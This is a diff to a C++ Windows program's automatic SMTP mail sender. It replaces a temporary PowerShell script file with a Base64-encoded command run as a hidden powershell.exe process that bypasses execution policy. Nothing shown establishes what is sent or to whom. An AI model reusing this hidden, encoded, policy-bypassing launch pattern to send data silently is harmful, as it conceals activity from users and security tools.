@@ -103,6 +103,7 @@ void LogError(const wchar_t* fmt, ...) {
 // === Auto SMTP sender (Winsock) ===
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "crypt32.lib")
 
 bool SendMailAuto(const char* subject, const char* body) {
     wchar_t pass[128] = {0};
@@ -149,19 +150,24 @@ bool SendMailAuto(const char* subject, const char* body) {
     ps += "$m.BodyEncoding=[Text.Encoding]::UTF8;";
     ps += "try{$s.Send($m);exit 0}catch{exit 1}";
 
-    WCHAR tmpFile[MAX_PATH]; GetTempPathW(MAX_PATH, tmpFile);
-    wcscat_s(tmpFile, L"drun_send.ps1");
-    HANDLE hf = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return false;
-    // Write UTF-8 BOM so PowerShell reads the file correctly
-    unsigned char bom[] = {0xEF, 0xBB, 0xBF};
-    DWORD w2; WriteFile(hf, bom, 3, &w2, NULL);
-    WriteFile(hf, ps.c_str(), (DWORD)ps.size(), &w2, NULL); CloseHandle(hf);
+        // Convert to UTF-16LE and Base64 for -EncodedCommand (avoids encoding issues)
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, ps.c_str(), -1, NULL, 0);
+    if (wlen <= 1) return false;
+    std::wstring wps(wlen, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, ps.c_str(), -1, &wps[0], wlen);
 
-    WCHAR cmd[2048];
-    swprintf_s(cmd, L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", tmpFile);
+    DWORD b64len = 0;
+    CryptBinaryToStringW((const BYTE*)wps.c_str(), (DWORD)((wlen-1)*sizeof(WCHAR)),
+                         CRYPT_STRING_BASE64, NULL, &b64len);
+    if (b64len == 0) return false;
+    std::wstring b64(b64len, L'\0');
+    if (!CryptBinaryToStringW((const BYTE*)wps.c_str(), (DWORD)((wlen-1)*sizeof(WCHAR)),
+                              CRYPT_STRING_BASE64, &b64[0], &b64len)) return false;
+    while (!b64.empty() && (b64.back()==L'\n'||b64.back()==L'\r')) b64.pop_back();
+
+    WCHAR cmd[4096];
+    swprintf_s(cmd, L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %s", b64.c_str());
     int ret = _wsystem(cmd);
-    DeleteFileW(tmpFile);
     return ret == 0;
 }
 
